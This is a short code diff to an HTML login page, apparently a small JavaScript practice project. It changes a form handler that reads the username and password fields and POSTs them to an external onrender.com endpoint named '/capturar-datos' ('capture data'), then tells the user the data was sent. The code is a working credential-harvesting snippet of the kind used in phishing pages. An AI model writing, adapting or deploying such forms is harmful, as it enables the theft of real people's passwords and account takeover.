@@ -22,23 +22,25 @@
             var password = document.getElementById('password').value;
 
             // Enviar los datos a tu servidor
-            fetch('https://prueba-js-9b0y.onrender.com', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ username: username, password: password })
-            })
-            .then(response => response.json())
-            .then(data => {
-                alert('Datos enviados con éxito!');
-            })
-            .catch(error => {
-                console.error('Error:', error);
-            });
+          fetch("https://prueba-js-9b0y.onrender.com/capturar-datos", {
+    method: "POST",
+    headers: {
+        "Content-Type": "application/json"
+    },
+    body: JSON.stringify({ username: username, password: password })
+})
+.then(response => response.json())
+.then(data => {
+    alert("Datos enviados con éxito!");
+})
+.catch(error => {
+    console.error("Error:", error);
+});
+
         });
     </script>
 </body>
 
 </html>
+
 
